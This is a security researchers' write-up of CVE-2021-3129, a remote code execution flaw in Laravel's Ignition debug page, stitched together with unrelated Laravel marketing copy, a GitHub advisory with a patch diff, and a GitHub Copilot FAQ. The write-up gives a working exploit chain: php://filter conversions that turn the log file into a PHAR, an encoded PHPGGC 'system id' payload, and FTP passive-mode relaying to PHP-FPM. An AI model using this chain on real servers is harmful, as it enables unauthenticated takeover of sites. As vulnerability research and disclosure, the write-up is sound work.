## Laravel <= v8.4.2 debug mode: Remote code execution

#####

![Polygonal Background](/theme/images/bkgd-top-edge.png)

# Laravel <= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)

In late November of 2020, during a security audit for one of our clients, we came accross a website based on [Laravel](https://laravel.com/). While the site's security state was pretty good, we remarked that it was running in debug mode, thus displaying verbose error messages including stack traces:

![](/images/laravel-debug-rce/1.png)

1

Upon further inspection, we discovered that these stack traces were generated by [Ignition](https://github.com/facade/ignition), which were the default Laravel error page generator starting at version 6. Having exhausted other vulnerability vectors, we started to have a more precise look at this package.

# Ignition <= 2.5.1

In addition to displaying beautiful stack traces, Ignition comes with *solutions*, small snippets of code that solve problems that you might encounter while developping your application. For instance, this is what happens if we use an unknown variable in a template:

![](/images/laravel-debug-rce/2.png)

2

By clicking "Make variable Optional", the `{{ $username }}` in our template is automatically replaced by `{{ $username ? '' }}`. If we check our HTTP log, we can see the endpoint that was invoked:

![](/images/laravel-debug-rce/3.png)

3

Along with the solution classname, we send a file path and a variable name that we want to replace. This looks interesting.

Let's first check the class name vector: can we instanciate anything ?

```
class SolutionProviderRepository implements SolutionProviderRepositoryContract
{
    ...

    public function getSolutionForClass(string $solutionClass): ?Solution
    {
        if (! class_exists($solutionClass)) {
            return null;
        }

        if (! in_array(Solution::class, class_implements($solutionClass))) {
            return null;
        }

        return app($solutionClass);
    }
}

```

No: Ignition will make sure the class we point to implements `RunnableSolution`.

Let's have a closer look at the class, then. The code responsible for this is located in `./vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php`. Maybe we can change the contents of an arbitrary file ?

```
class MakeViewVariableOptionalSolution implements RunnableSolution
{
    ...

    public function run(array $parameters = [])
    {
        $output = $this->makeOptional($parameters);
        if ($output !== false) {
            file_put_contents($parameters['viewFile'], $output);
        }
    }

    public function makeOptional(array $parameters = [])
    {
        $originalContents = file_get_contents($parameters['viewFile']); // [1]
        $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2]
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);

        if ($expectedTokens !== $newTokens) { // [3]
            return false;
        }

        return $newContents;
    }

    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
    {
        $expectedTokens = [];
        foreach ($originalTokens as $token) {
            $expectedTokens[] = $token;
            if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) {
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_COALESCE, '??', $token[2]];
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, "''", $token[2]];
            }
        }

        return $expectedTokens;
    }

    ...
}

```

The code is a bit more complex than we expected: after reading the given file path [1], and replacing `$variableName` by `$variableName ?? ''`, both the initial file and the new one will be tokenized [2]. If the structure of the code did not change more than expected, the file will be replaced with its new contents. Otherwise, `makeOptional` will return `false` [3], and the new file won't be written. Hence, we cannot do much using `variableName`.

The only input variable left is `viewFile`. If we make abstraction of `variableName` and all of its uses, we end up with the following code snippet:

```
$contents = file_get_contents($parameters['viewFile']);
file_put_contents($parameters['viewFile'], $contents);

```

So we're writing the contents of `viewFile` back into `viewFile`, without any modification whatsoever. This does **nothing** !

Looks like we have a CTF on our hands.

# Exploiting nothing

We came out with two solutions; if you want to try it yourself before reading the rest of the blog post, here's how you set up your lab:

```
$ git clone https://github.com/laravel/laravel.git
$ cd laravel
$ git checkout e849812
$ composer install
$ composer require facade/ignition==2.5.1
$ php artisan serve

```
## Log file to PHAR

### PHP wrappers: changing a file

By now, everyone has probably heard of the [upload progress technique demonstrated by Orange Tsai](http://blog.orange.tw/2018/10/). It uses `php://filter` to change the contents of a file before it is returned. We can use this to transform a file's contents using our exploit primitive:

```
$ echo test | base64 | base64 > /path/to/file.txt
$ cat /path/to/file.txt
ZEdWemRBbz0K

```
```
$f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt';
# Reads /path/to/file.txt, base64-decodes it, returns the result
$contents = file_get_contents($f);
# Base64-decodes $contents, then writes the result to /path/to/file.txt
file_put_contents($f, $contents);

```
```
$ cat /path/to/file.txt
test

```

We have changed the contents of the file ! Sadly, this applies the transformation twice. Reading the documentation shows us a way to only apply it once:

```
# To base64-decode once, use:
$f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt';
# OR
$f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt';

```

Badchars will even be ignored:

```
$ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt

```
```
$f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt';
$contents = file_get_contents($f);
file_put_contents($f, $contents);

```
```
$ cat /path/to/file.txt
test

```
### Writing the log file

By default, Laravel's log file, which contains every PHP error and stack trace, is stored in `storage/logs/laravel.log`. Let's generate an error by trying to load a file that does not exist, `SOME_TEXT_OF_OUR_CHOICE`:

```
[2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {"exception":"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75)

"}

```

Superb, we can inject (almost) arbitrary content in a file. In theory, we could use Orange's technique to convert the log file into a valid PHAR file, and then use the `phar://` wrapper to run serialized code. Sadly, this won't work, for a lot of reasons.

### The `base64-decode` chain shows its limits

We said earlier that PHP will ignore any badchar when base64-decoding a string. This is true, except for one character: `=`. If you use the `base64-decode` filter a string that contains a `=` in the middle, PHP will yield an error and return nothing.

This would be fine if we controlled the whole file. However, the text we inject into the log file is only a very small part of it. There is a decently sized prefix (the date), and a huge suffix (the stack trace) as well. Furthermore, our injected text is present twice !

Here's another horror:

```
php > var_dump(base64_decode(base64_decode('[2022-04-30 23:59:11]')));
string(0) ""
php > var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]')));
string(1) "2"

```

Depending on the date, decoding the prefix twice yields a result which a different size. When we decode it a third time, in the second case, our payload will be prefixed by `2`, changing the alignement of the base64 message.

In the cases were we *could* make it work, we'd have to build a new payload for each target, because the stack trace contains absolute filenames, and a new payload every second, because the prefix contains the time. And we'd still get blocked if a `=` managed to find its way into one of the many base64-decodes.

We therefore went back to the PHP doc to find other kinds of filters.

### Enters encoding

Let's backtrack a little. The log file contains this:

```
[previous log entries]
[prefix]PAYLOAD[midfix]PAYLOAD[suffix]

```

We have learned, regrettably, that spamming base64-decode would probably fail at some point. Let's use it to our advantage: if we spam it, a decoding error will happen, and the log file will get cleared !

Even better, we can use the (**undocumented**) "consumed" filter to achieve the same thing:

`php://filter/read=consumed/resource=/path/to/file.txt`

The next error we cause will stand alone in the log file:

```
[prefix]PAYLOAD[midfix]PAYLOAD[suffix]

```

Now, we're back to our original problem: keeping a payload and removing the rest. Luckily, `php://filter` is not limited to base64 operations. You can use it to convert charsets, for instance. Here's [UTF-16 to UTF-8](https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv):

```
echo -ne '[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0[midfix]P\0A\0Y\0L\0O\0A\0D\0[Some suffix ]' > /tmp/test.txt

```
```
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
åæµ¯â¥ç°æ¥ç¡©å´ PAYLOADæµæ©æ¥¦åµ¸PAYLOADåæµ¯â¥ç³æ¦ç¡©å´

```

This is really good: our payload is there, safe and sound, and the prefix and suffix became non-ASCII characters. However, in log entries, our payload is displayed twice, not once. We need to get rid of the second one.

Since UTF-16 works with two bytes, we can misalign the second instance of `PAYLOAD` by adding one byte at its end:

```
echo -ne '[Some prefix ]P\0A\0Y\0L\0O\0A\0D\0X[midfix]P\0A\0Y\0L\0O\0A\0D\0X[Some suffix ]' > /tmp/test.txt

```
```
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt');
åæµ¯â¥ç°æ¥ç¡©å´ PAYLOADå­æ¥­æ¤ç¡©åäå¤ä°ä¼ääå åæµ¯â¥ç³æ¦ç¡©å´

```

The beautiful thing about this is that the alignment of the prefix does not matter anymore: if it is of even size, the first payload will be decoded properly. If not, the second will.

We can now combine our findings with the usual base64-decoding to encode whatever we want:

```
$ echo -n TEST! | base64 | sed -E 's/./\0\\0/g'
V\0E\0V\0T\0V\0C\0E\0=\0
$ echo -ne '[Some prefix ]V\0E\0V\0T\0V\0C\0E\0=\0X[midfix]V\0E\0V\0T\0V\0C\0E\0=\0X[Some suffix ]' > /tmp/test.txt

```
```
php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt');
TEST!

```

Talking about alignement, how would the conversion filter behave if the log file is not 2-byte aligned itself ?

```
PHP Warning:  file_get_contents(): iconv stream filter ("utf16le"=>"utf-8"): invalid multibyte sequence in php shell code on line 1

```

Again, a problem. We can easily solve this one by two payloads: a harmless payload A, and the active payload, B. We'd have:

```
[prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix]
[prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix]

```

Since prefix, midfix and suffix are present twice, along with PAYLOAD\_A and PAYLOAD\_B, the log file would necessarily have an even size, avoiding the error.

Finally, we have a last problem to solve: we use NULL bytes to pad our payload bytes from one to two. Trying to load a file with a NULL byte in PHP results in the following error:

```
PHP Warning:  file_get_contents() expects parameter 1 to be a valid path, string given in php shell code on line 1

```

Therefore, we won't be able to inject a payload with NULL bytes in the error log. Luckily, a final filter comes to the rescue: [convert.quoted-printable-decode](https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable).

We can encode our NULL bytes using `=00`.

Here is our final conversion chain:

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log

```
### Complete exploit steps

Create a PHPGGC payload and encode it:

```
php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/=+$//g' | sed -E 's/./\0=00/g'
U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00

```

Clear logs:

```
viewFile: php://filter/read=consumed/resource=/path/to/storage/logs/laravel.log

```

Create first log entry, for alignment:

```
viewFile: AA

```

Create log entry with payload:

```
viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00

```

Apply our filter to convert the log file into a valid PHAR:

```
viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log

```

Launch the PHAR deserialization:

```
viewFile: phar:///path/to/storage/logs/laravel.log

```

Result:

![](/images/laravel-debug-rce/4.png)

As an exploit:

![](/images/laravel-debug-rce/5.png)

5

Right after confirming the attack in a local environment, we went on to test it on our target, **and it did not work**. The log file had a different name. After hours spent trying to guess its name, we could not, and resorted to implementing another attack. *We probably should have checked this a little bit ahead of time*.

## Talking to PHP-FPM using FTP

Since we could run `file_get_contents` for anything, we were able to scan common ports by issuing HTTP requests. PHP-FPM appeared to be listening on port 9000.

It is well-known that, if you can send an arbitrary binary packet to the PHP-FPM service, you can execute code on the machine. This technique is often used in combination with the `gopher://` protocol, which is supported by `curl`, but not by PHP.

Another protocol known for allowing you to send binary packets over TCP is FTP, and more precisely its passive mode: if a client tries to read a file from (resp. write to) an FTP server, the server can tell the client to read (resp. write) the contents of the file onto a specific IP and port. There is no limitation as to what these IP and port can be. For instance, the server can tell the client to connect to one of its own ports if it wants to.

Now, if we try to exploit the vulnerability with `viewFile=ftp://evil-server.lexfo.fr/file.txt`, here's what will happen:

1. `file_get_contents()` connects to our FTP server, and downloads file.txt.
2. `file_put_contents()` connects to our FTP server, and uploads it back to file.txt.

You probably know where this is going: we'll use the FTP protocol's passive mode to make `file_get_contents()` download a file on our server, and when it tries to upload it back using `file_put_contents()`, we will tell it to send the file to `127.0.0.1:9000`.

*This graph was inspired by the [hxp-2020 writeup from dfyz](https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/resonator).*

This allows us to send an arbitrary packet to PHP-FPM, and **therefore execute code**.

This time, the exploitation succeeded on our target.

# Conclusion

PHP is full of surprises: no other language would yield these vulns with the same two lines (although, to be fair, [Perl would have done it in one](https://perldoc.perl.org/functions/open)).

We reported the bug, along with a patch, to the maintainers of [`Ignition` on GitHub](https://github.com/facade/ignition/pull/334) on the 16th of November 2020, and a new version ([2.5.2](https://github.com/facade/ignition/releases/tag/2.5.2)) was issued the next day. Since it is a `require-dev` dependency of Laravel, we expect every instance installed after this date to be safe.

An exploit for the first technique is available here: [laravel-exploits](https://github.com/ambionics/laravel-exploits).

# Update on 2021-01-13

* [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) was assigned to the bug
* Improved the description for the FTP exploit part, adding a graph
* Added the improved log-clearing method using `consumed`

# The PHP Framework for Web Artisans

Laravel is a web application framework with expressive, elegant syntax. We’ve already laid the
foundation — freeing you to create without sweating the small things.

[Get Started](/docs/11.x)
[Watch Laracasts](https://laracasts.com)

## Write code for the joy of it.

Laravel values beauty. We love clean code just as much
as you do. Simple, elegant syntax puts amazing functionality at your fingertips. Every feature
has been thoughtfully considered to provide a wonderful developer experience.

[Start Learning](/docs/11.x)

## One Framework, Many Flavors

Build robust, full-stack applications in PHP using
Laravel and [Livewire](https://livewire.laravel.com). Love
JavaScript? Build a monolithic React or Vue driven frontend by pairing Laravel with [Inertia](https://inertiajs.com).

Or, let Laravel serve as a robust backend API for your
Next.js application, mobile application, or other frontend. Either way, our starter kits will have
you productive in minutes.

[Empower Your Frontend](/frontend)

## Everything you need to be amazing.

Out of the box, Laravel has elegant solutions for the
common features needed by all modern web applications. It's time to start building amazing applications and
stop wasting time searching for packages and reinventing the wheel.

* [Authentication](#authentication)
* [Authorization](#authorization)
* [Eloquent ORM](#eloquent)
* [Database Migrations](#migrations)
* [Validation](#validation)
* [Notifications & Mail](#notifications)
* [File Storage](#storage)
* [Job Queues](#queues)
* [Task Scheduling](#scheduling)
* [Testing](#testing)
* [Events & WebSockets](#events)

### Authentication

Authenticating users is as simple as adding an authentication middleware to your Laravel route definition:

```
Route::get('/profile', ProfileController::class)    ->middleware('auth');
```

Once the user is authenticated, you can access the authenticated user via the `Auth` facade:

```
use Illuminate\Support\Facades\Auth; // Get the currently authenticated user...$user = Auth::user();
```

Of course, you may define your own authentication middleware, allowing you to customize the authentication process.

For more information on Laravel's authentication features, check out the [authentication documentation](https://laravel.com/docs/authentication).

### Authorization

You'll often need to check whether an authenticated user is authorized to perform a specific action. Laravel's model policies make it a breeze:

```
php artisan make:policy UserPolicy
```

Once you've defined your authorization rules in the generated policy class, you can authorize the user's request in your controller methods:

```
public function update(Request $request, Invoice $invoice){    Gate::authorize('update', $invoice);     $invoice->update(/* ... */);}
```

[Learn more](https://laravel.com/docs/authorization)

### Eloquent ORM

Scared of databases? Don't be. Laravel’s Eloquent ORM makes it painless to interact with your application's data, and models, migrations, and relationships can be quickly scaffolded:

```
php artisan make:model Invoice --migration
```

Once you've defined your model structure and relationships, you can interact with your database using Eloquent's powerful, expressive syntax:

```
// Create a related model...$user->invoices()->create(['amount' => 100]); // Update a model...$invoice->update(['amount' => 200]); // Retrieve models...$invoices = Invoice::unpaid()->where('amount', '>=', 100)->get(); // Rich API for model interactions...$invoices->each->pay();
```

[Learn more](https://laravel.com/docs/eloquent)

### Database Migrations

Migrations are like version control for your database, allowing your team to define and share your application's database schema definition:

```
public function up(): void{    Schema::create('flights', function (Blueprint $table) {        $table->uuid()->primary();        $table->foreignUuid('airline_id')->constrained();        $table->string('name');        $table->timestamps();    });}
```

[Learn more](https://laravel.com/docs/migrations)

### Validation

Laravel has over 90 powerful, built-in validation rules and, using Laravel Precognition, can provide live validation on your frontend:

```
public function update(Request $request){    $validated = $request->validate([        'email' => 'required|email|unique:users',        'password' => Password::required()->min(8)->uncompromised(),    ]);     $request->user()->update($validated);}
```

[Learn more](https://laravel.com/docs/validation)

### Notifications & Mail

Use Laravel to quickly send beautifully styled notifications to your users via email, Slack, SMS, in-app, and more:

```
php artisan make:notification InvoicePaid
```

Once you have generated a notification, you can easily send the message to one of your application's users:

```
$user->notify(new InvoicePaid($invoice));
```

[Learn more](https://laravel.com/docs/notifications)

### File Storage

Laravel provides a robust filesystem abstraction layer, providing a single, unified API for interacting with local filesystems and cloud based filesystems like Amazon S3:

```
$path = $request->file('avatar')->store('s3');
```

Regardless of where your files are stored, interact with them using Laravel's simple, elegant syntax:

```
$content = Storage::get('photo.jpg'); Storage::put('photo.jpg', $content);
```

[Learn more](https://laravel.com/docs/filesystem)

### Job Queues

Laravel lets you to offload slow jobs to a background queue, keeping your web requests snappy:

```
$podcast = Podcast::create(/* ... */); ProcessPodcast::dispatch($podcast)->onQueue('podcasts');
```

You can run as many queue workers as you need to handle your workload:

```
php artisan queue:work redis --queue=podcasts
```

For more visibility and control over your queues, [Laravel Horizon](https://laravel.com/docs/horizon) provides a beautiful dashboard and code-driven configuration for your Laravel-powered Redis queues.

**Learn more**

* [Job Queues](https://laravel.com/docs/queues)
* [Laravel Horizon](https://laravel.com/docs/horizon)

### Task Scheduling

Schedule recurring jobs and commands with an expressive syntax and say goodbye to complicated configuration files:

```
$schedule->job(NotifySubscribers::class)->hourly();
```

Laravel's scheduler can even handle multiple servers and offers built-in overlap prevention:

```
$schedule->job(NotifySubscribers::class)    ->dailyAt('9:00')    ->onOneServer()    ->withoutOverlapping();
```

[Learn more](https://laravel.com/docs/scheduling)

### Testing

Laravel is built for testing. From unit tests to browser tests, you’ll feel more confident in deploying your application:

```
$user = User::factory()->create(); $this->browse(fn (Browser $browser) => $browser    ->visit('/login')    ->type('email', $user->email)    ->type('password', 'password')    ->press('Login')    ->assertPathIs('/home')    ->assertSee("Welcome {$user->name}"));
```

[Learn more](https://laravel.com/docs/testing)

### Events & WebSockets

Laravel's events allow you to send and listen for events across your application, and listeners can easily be dispatched to a background queue:

```
OrderShipped::dispatch($order);
```
```
class SendShipmentNotification implements ShouldQueue{    public function handle(OrderShipped $event): void    {        // ...    }}
```

Your frontend application can even subscribe to your Laravel events using [Laravel Echo](https://laravel.com/docs/broadcasting) and WebSockets, allowing you to build real-time, dynamic applications:

```
Echo.private(`orders.${orderId}`)    .listen('OrderShipped', (e) => {        console.log(e.order);    });
```

[Learn more](https://laravel.com/docs/events)

We've just scratched the surface. Laravel has you
covered for everything you will need to build a web application, including email verification, rate
limiting, and custom console commands. Check out the [Laravel documentation](https://laravel.com/docs/11.x) to keep learning.

## Move fast...

Laravel is committed to delivering the best testing
experience you can imagine. No more brittle tests that are a nightmare to maintain. Beautiful
testing APIs, database seeding, and painless browser testing let you ship with confidence.

[Learn More](/docs/http-tests)

## Enterprise scale without the enterprise complexity.

Our vast library of meticulously maintained packages means you're
ready for anything. Let [Laravel Octane](/docs/octane) supercharge your
application's performance, and experience infinite scale on [Laravel Vapor](https://vapor.laravel.com), our serverless deployment platform powered by AWS
Lambda.

## A community built for people like you.

Laravel is for everyone — whether you have been
programming for 20 years or 20 minutes. It's for architecture astronauts and weekend hackers. For
those with degrees and for those who dropped out to chase their dreams. Together, we create amazing
things.

Laravel is a web application framework with expressive, elegant syntax. We believe development must
be an enjoyable and creative experience to be truly fulfilling. Laravel attempts to take the pain
out of development by easing common tasks used in most web projects.

[Vulnerability details](/advisories/GHSA-4qwp-7c67-jmcc)
[Dependabot alerts
0](/advisories/GHSA-4qwp-7c67-jmcc/dependabot)

## Package

composer

facade/ignition
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

>= 2.5.0, < 2.5.2
>= 2.0.0, < 2.4.2
>= 1.7.0, < 1.16.14
< 1.6.15

## Patched versions

2.5.2
2.4.2
1.16.14
1.6.15

## Description

Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file\_get\_contents() and file\_put\_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| I would love to create a PR myself with the changes for the 1.16.4 release, but unfortunately everything lives in the same branch (both 2.x and 1.x versions of this package).  It would be fantastic if there was a way to push these changes to a 1.16.5 tag, so all the folks still using Laravel 6 and facade/ignition 1.x could benefit of this change.  ``` diff --git a/src/Solutions/MakeViewVariableOptionalSolution.php b/src/Solutions/MakeViewVariableOptionalSolution.php index 2903414..7e53117 100644 --- a/src/Solutions/MakeViewVariableOptionalSolution.php +++ b/src/Solutions/MakeViewVariableOptionalSolution.php @@ -4,6 +4,7 @@ namespace Facade\Ignition\Solutions;   use Facade\IgnitionContracts\RunnableSolution;  use Illuminate\Support\Facades\Blade; +use Illuminate\Support\Str;   class MakeViewVariableOptionalSolution implements RunnableSolution  { @@ -71,8 +72,24 @@ class MakeViewVariableOptionalSolution implements RunnableSolution          }      }  +    protected function isSafePath(string $path): bool +    { +        if (!Str::startsWith($path, ['/', './'])) { +            return false; +        } +        if (!Str::endsWith($path, '.blade.php')) { +            return false; +        } + +        return true; +    } +      public function makeOptional(array $parameters = [])      { +        if (!$this->isSafePath($parameters['viewFile'])) { +            return false; +        } +          $originalContents = file_get_contents($parameters['viewFile']);          $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ??

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### What are the differences between the GitHub Copilot Business, GitHub Copilot Enterprise, and GitHub Copilot Individual plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Individual is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

